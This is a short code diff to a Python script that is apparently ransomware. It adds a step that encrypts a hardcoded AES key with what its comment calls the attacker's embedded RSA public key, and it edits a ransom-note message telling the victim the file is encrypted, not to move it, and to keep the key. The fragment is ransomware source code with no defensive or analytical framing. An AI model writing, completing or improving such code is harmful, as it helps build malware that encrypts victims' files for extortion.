@@ -107,6 +107,14 @@ def main():
         else:
             print("Unidentified system")
             exit(0)
+
+    # Encrypt AES key with attacker's embedded RSA public key 
+    server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
+    encryptor = PKCS1_OAEP.new(server_key)
+    encrypted_key = encryptor.encrypt(HARDCODED_KEY)
+    encrypted_key_b64 = base64.b64encode(encrypted_key).decode("ascii")
+
+    print("Encrypted key " + encrypted_key_b64 + "\n")
             
     if encrypt:
         print("[COMPANY_NAME]\n\n"
@@ -116,7 +124,7 @@ def main():
             "DO NOT RENAME OR MOVE THE FILE\n\n"
             "THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY\n"
             "[begin_key]\n{}\n[end_key]\n"
-            "KEEP IT\n".format(public_key.decode("utf-8")))
+            "KEEP IT\n".format(SERVER_PUBLIC_RSA_KEY))
         key = HARDCODED_KEY
     if decrypt:
         # # RSA Decryption function - warning that private key is hardcoded for testing purposes
